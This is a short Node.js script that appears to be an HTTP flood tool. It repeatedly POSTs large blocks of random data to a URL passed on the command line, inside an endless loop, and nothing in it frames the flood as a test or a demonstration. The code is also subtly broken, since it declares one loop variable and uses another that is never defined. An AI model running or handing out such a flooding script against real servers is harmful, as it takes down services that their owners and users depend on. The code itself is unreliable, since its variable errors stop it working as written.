function startP(i){
	let request = require('request');
	
	let url = process.argv[2];
	let crypto = require('crypto');
	let data = crypto.randomBytes(15360).toString('hex');
	let options = {
	    url: url,
	    method: 'POST',
	    headers: {
	        'Content-Type': 'application/json',
	        'Content-Length': data.length
	    },
	    body: data
	};
	
	request(options)
    console.log(`Spawned ${j} process's`)
}
let i = 0;
while(true){
    startP(j);
    j++;
}